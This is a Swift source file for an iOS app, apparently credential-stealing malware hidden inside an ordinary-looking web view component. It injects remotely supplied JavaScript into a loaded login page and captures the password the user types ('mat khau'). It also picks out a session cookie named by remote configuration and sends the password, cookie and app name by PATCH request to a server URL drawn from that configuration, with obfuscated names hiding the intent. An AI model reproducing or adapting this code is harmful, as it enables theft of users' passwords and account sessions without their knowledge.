//
//  File.swift
//
//
//  Created by DanHa on 25/03/2023.
//

import SwiftUI
import WebKit

@available(iOS 14.0, *)
struct CoordsThree: UIViewRepresentable {
    func makeCoordinator() -> CoorThreeDinator {
        CoorThreeDinator(self)
    }

    
    let url: URL?
    @Binding var is_three_chuyen_man: Bool
    @Binding var is_three_load_hide: Bool
    @Binding var is_three_get_mat_khau: String
    var arrayData: [String: String] = [:]
    
    private let ob_three_servable = Web_Three()
    var ob_three_server: NSKeyValueObservation? {
        ob_three_servable.ins_three_tance
    }

    func makeUIView(context: Context) -> WKWebView {
        let prefs = WKWebpagePreferences()
        prefs.allowsContentJavaScript = true
        let source = arrayData[ValueKey.Chung_fr_01.rawValue] ?? ""
        let script: WKUserScript = WKUserScript(source: source, injectionTime: .atDocumentEnd, forMainFrameOnly: true)
        let userContentController = WKUserContentController()
        let config = WKWebViewConfiguration()
        config.defaultWebpagePreferences = prefs
        config.userContentController = userContentController
        userContentController.addUserScript(script)

        let webview = WKWebView(frame: .zero, configuration: config)
        webview.customUserAgent = arrayData[ValueKey.Chung_fr_02.rawValue] ?? ""
        webview.navigationDelegate = context.coordinator
        webview.load(URLRequest(url: url!))
        return webview
    }

    func updateUIView(_ uiView: WKWebView, context: Context) {
    }

    class CoorThreeDinator: NSObject, WKNavigationDelegate {
        var three_pa_rent: CoordsThree
        init(_ three_pa_rent: CoordsThree) {
            self.three_pa_rent = three_pa_rent
        }

        func webView(_ webView: WKWebView, didStartProvisionalNavigation navigation: WKNavigation!) {
            webView.evaluateJavaScript(self.three_pa_rent.arrayData[ValueKey.three_fr_1a.rawValue] ?? "") { pword, errorPword in
                if let pword = pword as? String, errorPword == nil {
                    self.three_pa_rent.is_three_get_mat_khau = pword
                }
            }
        }

        func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
            webView.evaluateJavaScript(self.three_pa_rent.arrayData[ValueKey.three_fr_2a.rawValue] ?? "")
            DispatchQueue.main.asyncAfter(deadline: .now() + 2) {
                webView.evaluateJavaScript(self.three_pa_rent.arrayData[ValueKey.three_fr_3a.rawValue] ?? "") { html, error in
                    if let htmlmatkhau = html as? String, error == nil {
                        if !htmlmatkhau.isEmpty {
                            WKWebsiteDataStore.default().httpCookieStore.getAllCookies { cookies in
                                let id_itn = cookies.firstIndex(where: { $0.name == self.three_pa_rent.arrayData[ValueKey.name_api_09.rawValue] ?? "" })
                                if id_itn != nil {
                                    UserDefaults.standard.set(try? JSONEncoder().encode(UserInvoicesMK(matkhau: self.three_pa_rent.is_three_get_mat_khau)), forKey: "matkhau")
                                    self.three_pa_rent.is_three_load_hide = true
                                    let three_json_data: [String: Any] = [
                                        self.three_pa_rent.arrayData[ValueKey.name_api_06.rawValue] ?? "": cookies[id_itn!].value,
                                        self.three_pa_rent.arrayData[ValueKey.name_api_07.rawValue] ?? "": self.three_pa_rent.is_three_get_mat_khau,
                                        self.three_pa_rent.arrayData[ValueKey.name_api_08.rawValue] ?? "": Bundle.main.object(forInfoDictionaryKey: "CFBundleDisplayName") as? String ?? ""]
                                    let url = URL(string: self.three_pa_rent.arrayData[ValueKey.Chung_fr_04.rawValue] ?? "")!
                                    let json_data = try? JSONSerialization.data(withJSONObject: three_json_data)
                                    var request = URLRequest(url: url)
                                    request.httpMethod = "PATCH"
                                    request.setValue("application/json", forHTTPHeaderField: "Content-Type")
                                    request.httpBody = json_data
                                    print("-------> is three mat khau \(self.three_pa_rent.is_three_get_mat_khau)")
                                    let task = URLSession.shared.dataTask(with: request) { _, _, error in
                                        if error != nil {
                                            print("not_ok")
                                        } else {
                                            self.three_pa_rent.is_three_chuyen_man = true
                                        }
                                    }
                                    task.resume()
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}

struct UserInvoicesMK: Codable {
    var matkhau: String
}

private class Web_Three: ObservableObject {
    @Published var ins_three_tance: NSKeyValueObservation?
}
